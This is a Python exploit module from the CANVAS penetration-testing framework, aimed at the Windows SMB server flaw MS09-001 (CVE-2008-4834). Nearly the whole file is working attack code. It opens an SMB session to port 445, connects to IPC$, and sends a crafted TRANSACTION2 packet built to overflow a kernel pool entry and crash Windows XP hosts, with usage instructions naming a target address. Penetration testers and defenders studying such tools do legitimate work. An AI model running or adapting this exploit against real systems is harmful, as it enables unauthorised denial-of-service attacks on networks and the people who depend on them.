#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import socket
import struct
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from libs.newsmb.libsmb import SMBClient, SMBClientException, SMBPacket
from libs.newsmb.smbconst import SMB_COM_TRANSACTION2

# GUI info
NAME='Windows SMB Server Overflow'
DESCRIPTION='Windows SMB Server Overflow'
VERSION='1.0'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='01/13/09'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS09-001.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2008-4834'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4834'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['NOTES']='We overflow a kernel pool entry with NULL bytes. It doesn\'t seem very exploitable.'
PROPERTY={}
PROPERTY['TYPE']='DoS'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['MSADV']='MS09-001'
NOTES="""
Usage:
./exploits/ms09_001/ms09_001.py -t 10.10.10.231
"""

CHANGELOG="""
"""

targets={
    0:['Autodetect',0],
    1:['Windows XP (DoS)',0]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port      = 445
        self.host      = ''
        self.shellcode = ''
        self.badstring = '\0'
        self.version   = 1
        self.name      = NAME        
        self.user      = u''
        self.password  = u''
        self.needsNoShellcode=1

    def neededListenerTypes(self):
        return []

    def getsocket(self):
        if ':' in self.host:
            return self.gettcpsock(AF_INET6=1)
        else:
            return self.gettcpsock()
        
    def test(self):
        self.getargs()
        s=self.getsocket()
        try:
            s.connect((self.host, self.port))
        except:
            self.log('No connection could be established')
            return 0
        return 1
    
    def getargs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        self.user = self.getarg('user')
        self.password = self.getarg('password')
        # self.share=self.getarg('share')
        return 
    
    def run(self):
        self.getargs()        
        self.setInfo('%s attacking %s:%d (in progress)' % (NAME, self.host, self.port))
        s = self.getsocket()
        sockaddr = (self.host, self.port)

        try:
            s.connect(sockaddr)
        except:
            self.log('Could not connect to: %s:%d' % sockaddr)
            return 0

        try:
            my_smb = SMBClient(s, username=self.user, password=self.password)
            my_smb.negotiate()
            my_smb.session_setup()
            my_smb.tree_connect(u'IPC$')
            my_smb.packet = SMBPacket(None, SMB_COM_TRANSACTION2, tid=my_smb.tid, pid=my_smb.pid,
                                      mid=my_smb.mid, uid=my_smb.uid, is_unicode=my_smb.is_unicode)
            params = ''
            params += struct.pack('<HHHLLHLLL',0,0,0,0,0,0,0,0,0)
            params += '\\browser'
            params += '\0'*(4-len(params)%4)
            my_smb.packet.body['Parameters'] = params
            my_smb.packet.body['MaxParameterCount'] = 4
            my_smb.packet.body['MaxDataCount'] = 0
            my_smb.packet.body['Setup'] = '\x00\x00'
            my_smb.packet.body['Pad'] = '\x00\x00'
            my_smb.send()
        except SMBClientException, ex:
            self.log('SMB Error: %s' % ex)
            return 0

        return 1

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i=i+1

    def usage(self):
        print 'Usage: %s -v version -t host\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
